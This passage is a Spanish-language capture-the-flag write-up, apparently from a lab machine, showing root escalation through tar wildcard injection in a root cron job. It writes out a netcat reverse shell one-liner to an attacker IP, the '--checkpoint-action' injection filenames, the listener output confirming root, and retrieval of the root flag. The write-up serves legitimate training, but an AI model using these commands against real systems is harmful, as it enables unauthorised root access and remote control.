1. Preparación del Payload en /var/www/html
   
Una vez que identificamos el Cron Job vulnerable ejecutándose como root (Paso 20), inyectamos nuestra reverse shell en el directorio donde el script backup.sh ejecuta el comando tar cf ... *.

<img width="894" height="327" alt="dentro del shell ejecuto el reverse siguiendo las indicaciones de la pagina web" src="https://github.com/user-attachments/assets/cc2c3a4d-d5c6-46d5-a5a4-c7a6e8205b00" />


💻 Comandos de Inyección (usando el listener en el puerto 8000 para la shell root, como se ve en la captura):
````
Bash

cd /var/www/html

# 1. Creamos el script de shell (ajusta TU_IP_KALI y PUERTO)
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.147.155 8000 >/tmp/f" > shell2.sh
# 2. Creamos los archivos de inyección de tar
echo "" > "--checkpoint-action=exec=sh shell2.sh"
echo "" > "--checkpoint=1"
````
(La captura dentro del shell ejecuto el reverse siguiendo las indicaciones de la pagina web.png muestra la inyección de los archivos en el directorio /var/www/html.)

2. Obtención de la Shell de Root

Con nuestro listener de Netcat configurado en el puerto 8000, esperamos la ejecución del Cron Job de root.

Al ejecutarse, tar interpreta los archivos inyectados y ejecuta shell2.sh, que nos envía una reverse shell de alta prioridad.

💻 Resultado del Listener:
````
Bash

nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.11.147.155] from (UNKNOWN) [10.10.40.222] 53438
# whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
````

¡Éxito! La identificación de usuario y grupo (uid=0, gid=0) confirma que hemos obtenido una shell con permisos de root.

3. Recuperación de la Flag Root

Finalmente, navegamos al directorio /root para obtener la última flag.

💻 Comandos y Resultado:
````
Bash

cd /root
ls
root.txt
cat root.txt
3f...
````
✅ ¡FLAG ROOT CONSEGUIDA!

<img width="797" height="709" alt="obtengo el shell y la flag root" src="https://github.com/user-attachments/assets/fb9f8ccd-6cd9-49cd-a98a-4eea8b442d7b" />

